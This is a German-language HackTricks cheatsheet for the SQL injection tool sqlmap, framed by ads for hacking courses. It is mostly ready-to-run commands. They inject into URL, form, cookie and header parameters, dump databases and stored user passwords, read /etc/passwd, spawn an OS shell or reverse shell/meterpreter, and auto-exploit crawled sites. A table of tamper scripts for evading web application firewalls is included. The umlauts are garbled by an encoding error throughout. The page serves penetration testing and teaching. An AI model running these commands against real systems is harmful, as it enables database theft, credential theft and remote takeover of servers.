# SQLMap - Cheatsheet

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Sofort verf√ºgbarer Setup f√ºr Schwachstellenbewertung & Penetrationstests**. F√ºhren Sie einen vollst√§ndigen Pentest von √ºberall mit √ºber 20 Tools & Funktionen durch, die von Recon bis Reporting reichen. Wir ersetzen keine Pentester - wir entwickeln ma√ügeschneiderte Tools, Erkennungs- & Ausnutzungs-Module, um ihnen etwas Zeit zur√ºckzugeben, um tiefer zu graben, Shells zu √∂ffnen und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Grundlegende Argumente f√ºr SQLmap

### Allgemein
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### Informationen abrufen

#### Intern
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### DB-Daten
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Injectionstelle

### Aus Burp/ZAP-Erfassung

Erfassen Sie die Anfrage und erstellen Sie eine req.txt-Datei
```bash
sqlmap -r req.txt --current-user
```
### GET-Anforderungsinjektion
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST-Anforderungsinjektion
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Injektionen in Headern und anderen HTTP-Methoden
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Geben Sie eine Zeichenfolge an, wenn die Injektion erfolgreich ist
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap** erm√∂glicht die Verwendung von `-e` oder `--eval`, um jede Nutzlast vor dem Senden mit einem Python-Oneliner zu verarbeiten. Dies macht es sehr einfach und schnell, die Nutzlast auf benutzerdefinierte Weise vor dem Senden zu verarbeiten. Im folgenden Beispiel **wird die Flask-Cookie-Sitzung von Flask mit dem bekannten Geheimnis signiert, bevor sie gesendet wird**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Datei lesen
```bash
--file-read=/etc/passwd
```
### Crawlen Sie eine Website mit SQLmap und automatischem Exploit
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Zweite Ordnung Injektion
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Lies diesen Beitrag** ](second-order-injection-sqlmap.md)**√ºber die Durchf√ºhrung einfacher und komplexer zweiter Ordnung Injektionen mit sqlmap.**

## Anpassen der Injektion

### Setze ein Suffix
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Pr√§fix
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Hilfe bei der Suche nach boolescher Injektion
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper

Denken Sie daran, dass **Sie Ihre eigenen Tamper in Python erstellen k√∂nnen** und es sehr einfach ist. Sie finden ein Tamper-Beispiel auf der [Seite zur Zweiten Ordnung Injektion hier](second-order-injection-sqlmap.md).
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Beschreibung                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Ersetzt das Apostroph-Zeichen durch sein UTF-8-Vollbreiten-Gegenst√ºck                                                               |
| apostrophenullencode.py      | Ersetzt das Apostroph-Zeichen durch sein illegales doppeltes Unicode-Gegenst√ºck                                                      |
| appendnullbyte.py            | F√ºgt am Ende der Payload ein kodiertes NULL-Byte-Zeichen hinzu                                                                        |
| base64encode.py              | Kodiert alle Zeichen in einer gegebenen Payload in Base64                                                                             |
| between.py                   | Ersetzt den Gr√∂√üer-als-Operator ('>') durch 'NOT BETWEEN 0 AND #'                                                                    |
| bluecoat.py                  | Ersetzt das Leerzeichen nach der SQL-Anweisung durch ein g√ºltiges zuf√§lliges Leerzeichen. Danach wird das Zeichen = durch den LIKE-Operator ersetzt |
| chardoubleencode.py          | Doppelt URL-kodiert alle Zeichen in einer gegebenen Payload (verarbeitet keine bereits kodierten Zeichen)                           |
| commalesslimit.py            | Ersetzt Instanzen wie 'LIMIT M, N' durch 'LIMIT N OFFSET M'                                                                         |
| commalessmid.py              | Ersetzt Instanzen wie 'MID(A, B, C)' durch 'MID(A FROM B FOR C)'                                                                    |
| concat2concatws.py           | Ersetzt Instanzen wie 'CONCAT(A, B)' durch 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                                 |
| charencode.py                | URL-kodiert alle Zeichen in einer gegebenen Payload (verarbeitet keine bereits kodierten Zeichen)                                    |
| charunicodeencode.py         | Unicode-URL-kodiert nicht kodierte Zeichen in einer gegebenen Payload (verarbeitet keine bereits kodierten Zeichen). "%u0022"       |
| charunicodeescape.py         | Unicode-URL-kodiert nicht kodierte Zeichen in einer gegebenen Payload (verarbeitet keine bereits kodierten Zeichen). "\u0022"       |
| equaltolike.py               | Ersetzt alle Vorkommen des Operators gleich ('=') durch den Operator 'LIKE'                                                         |
| escapequotes.py              | Schr√§gstrich-Escape f√ºr Anf√ºhrungszeichen (' und ")                                                                                  |
| greatest.py                  | Ersetzt den Gr√∂√üer-als-Operator ('>') durch das 'GREATEST'-Gegenst√ºck                                                               |
| halfversionedmorekeywords.py | F√ºgt vor jedem Schl√ºsselwort einen versionierten MySQL-Kommentar hinzu                                                                |
| ifnull2ifisnull.py           | Ersetzt Instanzen wie 'IFNULL(A, B)' durch 'IF(ISNULL(A), B, A)'                                                                    |
| modsecurityversioned.py      | Umgibt die gesamte Abfrage mit einem versionierten Kommentar                                                                          |
| modsecurityzeroversioned.py  | Umgibt die gesamte Abfrage mit einem null-versionierten Kommentar                                                                     |
| multiplespaces.py            | F√ºgt mehrere Leerzeichen um SQL-Schl√ºsselw√∂rter hinzu                                                                                 |
| nonrecursivereplacement.py   | Ersetzt vordefinierte SQL-Schl√ºsselw√∂rter durch f√ºr den Austausch geeignete Darstellungen (z.B. .replace("SELECT", "")) Filter      |
| percentage.py                | F√ºgt ein Prozentzeichen ('%') vor jedem Zeichen hinzu                                                                                 |
| overlongutf8.py              | Konvertiert alle Zeichen in einer gegebenen Payload (verarbeitet keine bereits kodierten Zeichen)                                    |
| randomcase.py                | Ersetzt jedes Schl√ºsselwortzeichen durch einen zuf√§lligen Gro√ü-/Kleinbuchstaben                                                       |
| randomcomments.py            | F√ºgt zuf√§llige Kommentare zu SQL-Schl√ºsselw√∂rtern hinzu                                                                              |
| securesphere.py              | F√ºgt eine speziell gestaltete Zeichenfolge hinzu                                                                                     |
| sp\_password.py              | F√ºgt 'sp\_password' am Ende der Payload zur automatischen Obfuskation aus DBMS-Protokollen hinzu                                   |
| space2comment.py             | Ersetzt das Leerzeichen-Zeichen (' ') durch Kommentare                                                                                |
| space2dash.py                | Ersetzt das Leerzeichen-Zeichen (' ') durch einen Strichkommentar ('--'), gefolgt von einer zuf√§lligen Zeichenfolge und einer neuen Zeile ('\n') |
| space2hash.py                | Ersetzt das Leerzeichen-Zeichen (' ') durch ein Pfund-Zeichen ('#'), gefolgt von einer zuf√§lligen Zeichenfolge und einer neuen Zeile ('\n') |
| space2morehash.py            | Ersetzt das Leerzeichen-Zeichen (' ') durch ein Pfund-Zeichen ('#'), gefolgt von einer zuf√§lligen Zeichenfolge und einer neuen Zeile ('\n') |
| space2mssqlblank.py          | Ersetzt das Leerzeichen-Zeichen (' ') durch ein zuf√§lliges Leerzeichen aus einem g√ºltigen Satz alternativer Zeichen                  |
| space2mssqlhash.py           | Ersetzt das Leerzeichen-Zeichen (' ') durch ein Pfund-Zeichen ('#'), gefolgt von einer neuen Zeile ('\n')                          |
| space2mysqlblank.py          | Ersetzt das Leerzeichen-Zeichen (' ') durch ein zuf√§lliges Leerzeichen aus einem g√ºltigen Satz alternativer Zeichen                  |
| space2mysqldash.py           | Ersetzt das Leerzeichen-Zeichen (' ') durch einen Strichkommentar ('--'), gefolgt von einer neuen Zeile ('\n')                      |
| space2plus.py                | Ersetzt das Leerzeichen-Zeichen (' ') durch ein Pluszeichen ('+')                                                                     |
| space2randomblank.py         | Ersetzt das Leerzeichen-Zeichen (' ') durch ein zuf√§lliges Leerzeichen aus einem g√ºltigen Satz alternativer Zeichen                  |
| symboliclogical.py           | Ersetzt die logischen Operatoren AND und OR durch ihre symbolischen Gegenst√ºcke (&& und                                             |
| unionalltounion.py           | Ersetzt UNION ALL SELECT durch UNION SELECT                                                                                         |
| unmagicquotes.py             | Ersetzt das Anf√ºhrungszeichen-Zeichen (') durch eine Multi-Byte-Kombination %bf%27 zusammen mit einem generischen Kommentar am Ende (um es zum Laufen zu bringen) |
| uppercase.py                 | Ersetzt jedes Schl√ºsselwortzeichen durch den Gro√übuchstabenwert 'INSERT'                                                             |
| varnish.py                   | F√ºgt einen HTTP-Header 'X-originating-IP' hinzu                                                                                     |
| versionedkeywords.py         | Umgibt jedes Nicht-Funktionsschl√ºsselwort mit einem versionierten MySQL-Kommentar                                                    |
| versionedmorekeywords.py     | Umgibt jedes Schl√ºsselwort mit einem versionierten MySQL-Kommentar                                                                   |
| xforwardedfor.py             | F√ºgt einen gef√§lschten HTTP-Header 'X-Forwarded-For' hinzu                                                                          |

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Sofort verf√ºgbare Einrichtung f√ºr Schwachstellenbewertung & Pentesting**. F√ºhren Sie einen vollst√§ndigen Pentest von √ºberall mit √ºber 20 Tools & Funktionen durch, die von Recon bis Reporting reichen. Wir ersetzen keine Pentester - wir entwickeln ma√ügeschneiderte Tools, Erkennungs- & Ausnutzungs-Module, um ihnen etwas Zeit zur√ºckzugeben, um tiefer zu graben, Shells zu knacken und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
